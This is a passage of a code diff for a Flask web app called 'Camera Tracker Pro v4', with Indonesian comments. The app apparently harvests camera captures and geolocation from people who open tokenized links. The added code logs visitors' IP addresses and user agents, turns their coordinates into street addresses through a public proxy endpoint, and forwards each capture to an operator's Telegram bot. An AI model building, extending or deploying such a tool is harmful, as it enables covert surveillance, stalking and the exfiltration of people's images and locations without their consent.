     db.execute("UPDATE tokens SET used=1 WHERE id=?", (token,))
     db.commit(); db.close()
+
+    try: telegram_notify(cap_type, data, row["label"], address)
+    except: pass
     return jsonify(ok=True)
 
-
-# ─── API: Ambil Captures ─────────────────────────────────────────────────────
 @app.route("/api/captures/<token>")
 @login_required
 def get_captures(token):
     db = get_db()
     rows = db.execute(
-        "SELECT id,type,data,captured_at FROM captures"
-        " WHERE token_id=? ORDER BY id DESC LIMIT 50", (token,)).fetchall()
-    db.close()
-    return jsonify([dict(r) for r in rows])
+        "SELECT id,type,data,address,captured_at FROM captures WHERE token_id=? ORDER BY id DESC LIMIT 50",
+        (token,)).fetchall()
+    db.close(); return jsonify([dict(r) for r in rows])
 
-
-# ─── API: Hapus Capture ───────────────────────────────────────────────────────
 @app.route("/api/capture/<int:cid>", methods=["DELETE"])
 @login_required
 def del_capture(cid):
+    db = get_db(); db.execute("DELETE FROM captures WHERE id=?", (cid,)); db.commit(); db.close()
+    return jsonify(ok=True)
+
+@app.route("/api/logs/<token>")
+@login_required
+def get_logs(token):
     db = get_db()
-    db.execute("DELETE FROM captures WHERE id=?", (cid,))
-    db.commit(); db.close()
+    rows = db.execute(
+        "SELECT ip_address,user_agent,accessed_at FROM access_logs WHERE token_id=? ORDER BY id DESC LIMIT 50",
+        (token,)).fetchall()
+    db.close(); return jsonify([dict(r) for r in rows])
+
+
+# ── API: Reverse Geocoding Proxy ──────────────────────────────────────────────
+
+@app.route("/api/address")
+def get_address():
+    """Public endpoint — dipanggil dari halaman device (bukan admin)."""
+    lat = request.args.get("lat"); lng = request.args.get("lng")
+    if not lat or not lng: return jsonify(error="missing params"), 400
+    if not REQUESTS_OK: return jsonify(display_name=""), 200
+    try:
+        r = req_lib.get("https://nominatim.openstreetmap.org/reverse",
+            params={"lat":lat,"lon":lng,"format":"json"},
+            headers={"User-Agent":"CameraTrackerPro/4.0"}, timeout=5)
+        return jsonify(r.json())
+    except: return jsonify(display_name=""), 200
+
+
+# ── API: Templates ────────────────────────────────────────────────────────────
+
+@app.route("/api/templates", methods=["GET"])
+@login_required
+def list_templates():
+    db = get_db()
+    rows = db.execute("SELECT id,name,config_json,created_at FROM templates ORDER BY id DESC").fetchall()
+    db.close(); return jsonify([dict(r) for r in rows])
+
+@app.route("/api/templates", methods=["POST"])
+@login_required
+def save_template():
+    b = request.json or {}
+    name = b.get("name","").strip()
+    if not name: return jsonify(error="Nama template kosong"), 400
+    cfg  = json.dumps(b.get("config",{}))
+    db = get_db()
+    db.execute("INSERT INTO templates (name,config_json,created_at) VALUES (?,?,?)",
+               (name, cfg, datetime.now().isoformat()))
+    db.commit(); db.close(); return jsonify(ok=True)
+
+@app.route("/api/templates/<int:tid>", methods=["DELETE"])
+@login_required
+def del_template(tid):
+    db = get_db(); db.execute("DELETE FROM templates WHERE id=?", (tid,)); db.commit(); db.close()
     return jsonify(ok=True)
 
 
-# ─── Entry Point ─────────────────────────────────────────────────────────────
+# ── API: Telegram ─────────────────────────────────────────────────────────────
+
+@app.route("/api/telegram", methods=["GET"])
+@login_required
+def tg_get(): return jsonify(bot_token=get_cfg("tg_bot_token"), chat_id=get_cfg("tg_chat_id"))
+
+@app.route("/api/telegram", methods=["POST"])
+@login_required
+def tg_set():
+    b = request.json or {}
+    set_cfg("tg_bot_token", b.get("bot_token",""))
+    set_cfg("tg_chat_id",   b.get("chat_id",""))
+    return jsonify(ok=True)
+
+@app.route("/api/telegram/test", methods=["POST"])
+@login_required
+def tg_test():
+    bot = get_cfg("tg_bot_token"); cid = get_cfg("tg_chat_id")
+    if not bot or not cid: return jsonify(error="Belum dikonfigurasi"), 400
+    if not REQUESTS_OK: return jsonify(error="Library requests belum terinstall"), 500
+    try:
+        r = req_lib.post(f"https://api.telegram.org/bot{bot}/sendMessage",
+            data={"chat_id":cid,"text":"✅ Camera Tracker Pro v4 terhubung!"}, timeout=10)
+        d = r.json()
+        return jsonify(ok=True) if d.get("ok") else jsonify(error=d.get("description","")), 400
+    except Exception as e: return jsonify(error=str(e)), 500
+
+
+# ── API: App Config (Rate Limit, Timezone) ────────────────────────────────────
+
+@app.route("/api/app-config", methods=["GET"])
+@login_required
+def app_config_get():
+    return jsonify(
+        rl_max_requests=get_cfg("rl_max_requests","0"),
+        rl_window_minutes=get_cfg("rl_window_minutes","5"),
+        timezone_offset=get_cfg("timezone_offset","7"))
+
+@app.route("/api/app-config", methods=["POST"])
+@login_required
+def app_config_set():
+    b = request.json or {}
+    for k in ["rl_max_requests","rl_window_minutes","timezone_offset"]:
+        if k in b: set_cfg(k, str(b[k]))
+    return jsonify(ok=True)
+
+
 if __name__ == "__main__":
     app.run(debug=False, host="0.0.0.0", port=5000)
